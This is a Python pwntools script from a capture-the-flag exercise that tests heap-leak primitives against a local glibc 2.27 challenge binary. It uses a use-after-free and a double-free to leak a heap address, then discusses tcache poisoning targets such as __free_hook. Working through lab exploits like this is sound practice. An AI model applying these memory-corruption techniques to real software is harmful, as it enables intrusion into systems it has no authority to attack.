#!/usr/bin/env python3
"""
Cyber-Bankrupt: Leak Primitive Tests

Tests approach #1 (unsorted bin leak via alloc then free)
and approach #2 (barrier/heap leak via double-free).

Binary: glibc 2.27, no tcache key, UAF, single slot (acc[0]).
"""
from pwn import *

context.binary = ELF('/home/gluppler/Downloads/CTFs-Testing/Pwn/Medium/Cyber-Bankrupt/challenge/cyber_bankrupt')
libc = ELF('/home/gluppler/Downloads/CTFs-Testing/Pwn/Medium/Cyber-Bankrupt/challenge/glibc/libc.so.6')
context.log_level = 'info'

PIN = b'6969'
BINDIR = '/home/gluppler/Downloads/CTFs-Testing/Pwn/Medium/Cyber-Bankrupt/challenge'

def start():
    return process(
        ['./glibc/ld-linux-x86-64.so.2', '--library-path', './glibc/', './cyber_bankrupt'],
        cwd=BINDIR,
        env={'LD_LIBRARY_PATH': './glibc/'}
    )

def menu(p, idx):
    p.sendlineafter(b'> ', str(idx).encode())

def transfer(p, amount, data, bank_id=0):
    assert 1 <= amount <= 0x420
    menu(p, 1)
    p.sendlineafter(b'Bank ID: ', str(bank_id).encode())
    p.sendlineafter(b'transfer: ', str(amount).encode())
    p.sendafter(b'receiver: ', data)
    p.recvuntil(b'succeed!')

def clear_history(p, bank_id=0):
    menu(p, 2)
    p.sendlineafter(b'Bank ID: ', str(bank_id).encode())
    p.recvuntil(b'out!')

def view_details(p, bank_id=0):
    menu(p, 3)
    p.sendlineafter(b'Bank ID: ', str(bank_id).encode())
    return p.recvline()


def test_approach1_unsorted_bin_leak():
    """Approach 1: Alloc 0x420 → free → view.

    In glibc 2.27, a 0x430 chunk is above tcache max (0x410).
    On free it goes through the normal path.
    If adjacent to top chunk → consolidates (no fd/bk set; no leak).
    """
    print("=" * 66)
    print("TEST 1: Alloc 0x420 → free → view (unsorted bin leak)")
    print("=" * 66)

    p = start()
    p.recvuntil(b'pin:')
    p.sendline(PIN)

    transfer(p, 0x420, b'MARKER_DATA')

    clear_history(p)

    result = view_details(p)

    if b'MARKER_DATA' in result:
        print(f"  view_details: {result.strip()}")
        print(f"  => Our data survived. Chunk CONSOLIDATED with top.")
        print(f"  => No fd/bk pointers were set. NO LIBC LEAK.")
        leak_status = "FAIL (consolidated with top)"
    else:
        clean = result.strip()
        if len(clean) >= 6:
            val = u64(clean[:8].ljust(8, b'\x00'))
            print(f"  view_details: {clean.hex()} = {hex(val)}")
            if val >> 40 in (0x7f,):
                print("  => LIBC LEAK!")
                leak_status = "LIBC LEAK"
            else:
                print(f"  => Unknown data type (upper={hex(val >> 40)})")
                leak_status = "UNKNOWN"
        else:
            print(f"  view_details: {result}")
            leak_status = "EMPTY"

    p.close()
    return leak_status


def test_approach2_double_free_leak():
    """Approach 2: Double-free → heap leak via stale tcache next ptr.

    glibc 2.27 has NO tcache key. Double-free sets tcache next = A.
    view_details (puts) reads this pointer → heap address leak.
    """
    print()
    print("=" * 66)
    print("TEST 2: Double-free → heap leak (stale tcache next ptr)")
    print("=" * 66)

    p = start()
    p.recvuntil(b'pin:')
    p.sendline(PIN)

    # Alloc A (0x20)
    transfer(p, 0x18, b'AAAAAAAA')
    print("  [1] Alloc chunk A (0x30)")

    # Free A → tcache[0x20], next=NULL, count=1
    clear_history(p)
    print("  [2] Free A → tcache, next=NULL")

    # Double-free A → tcache[0x20], next=A, count=2
    clear_history(p)
    print("  [3] Double-free A → tcache, next=A")

    # View: puts(A) → reads A->next = A's heap address
    result = view_details(p)
    clean = result.strip()
    if len(clean) >= 6:
        leak = u64(clean[:8].ljust(8, b'\x00'))
        print(f"  [4] view_details: {clean.hex()} = {hex(leak)}")

        # Verify via /proc
        pid = p.pid
        try:
            with open(f'/proc/{pid}/maps') as f:
                for line in f:
                    if '[heap]' in line:
                        hs = int(line.split('-')[0], 16)
                        he = int(line.split('-')[1].split()[0], 16)
                        if hs <= leak < he:
                            print(f"  => HEAP ADDRESS confirmed")
                            print(f"     heap: {hex(hs)}-{hex(he)}")
                            print(f"     offset: +{hex(leak-hs)}")
                        break
        except:
            pass
    else:
        leak = 0
        print(f"  [4] view_details: {result} (empty or too short)")

    p.close()
    return leak


def writeup():
    """Print final analysis."""
    print()
    print("=" * 66)
    print("ANALYSIS")
    print("=" * 66)
    print("""
APPROACH 1 (unsorted bin leak): FAILS
  Alloc 0x420 → free → view returns our own data, not a libc address.
  The chunk (0x430) is too large for tcache but consolidates with the
  top chunk because there's no barrier chunk above it. No fd/bk set.

APPROACH 2 (double-free): GIVES HEAP LEAK
  Double-free a small chunk → tcache next pointer = chunk's own address.
  view_details (puts) reads this → heap address leak.

WHY NO LIBC LEAK?
  With only ONE slot (acc[0]), each alloc overwrites the previous pointer.
  To get a chunk into unsorted bin (which sets fd/bk = main_arena libc
  pointers), we need a barrier chunk between it and top. But allocating
  the barrier AFTER the target chunk overwrites acc[0], losing access.
  
  Without a libc leak, tcache poison can't target __free_hook or stdout.

POSSIBLE ESCAPE?
  The BSS write (acc[read_len]=0) might corrupt something useful, but it
  only writes FORWARD from acc (higher addresses), missing stdin/stdout
  which are at LOWER addresses in BSS.
  
  Full RELRO prevents GOT overwrite. PIE prevents fixed addresses.
  Circular dependency: need leak → need unsorted bin → need barrier → 
  need 2 slots → have 1 slot.

The true intended solution likely involves a technique not yet identified
(possibly leveraging the BSS write in an unexpected way, or using an
unsorted bin chunk created during libc initialization).
""")


if __name__ == '__main__':
    r1 = test_approach1_unsorted_bin_leak()
    r2 = test_approach2_double_free_leak()
    writeup()
